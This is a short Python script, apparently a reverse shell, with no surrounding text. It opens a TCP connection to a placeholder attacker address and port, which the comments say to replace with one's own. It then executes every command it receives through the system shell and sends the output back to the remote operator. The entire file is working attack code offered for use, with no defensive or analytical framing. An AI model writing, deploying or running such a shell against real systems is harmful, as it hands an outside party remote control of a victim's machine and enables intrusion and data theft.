import socket
import subprocess
import os

ATTACKER_IP = '0.0.0.0'  # Change to your IP
ATTACKER_PORT = 4444           # Change to your listening port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ATTACKER_IP, ATTACKER_PORT))
    s.send(b'[+] Connection established!\n')

    while True:
        cmd = s.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            output = str(e).encode()
        s.send(output)
except Exception as e:
    s.close()
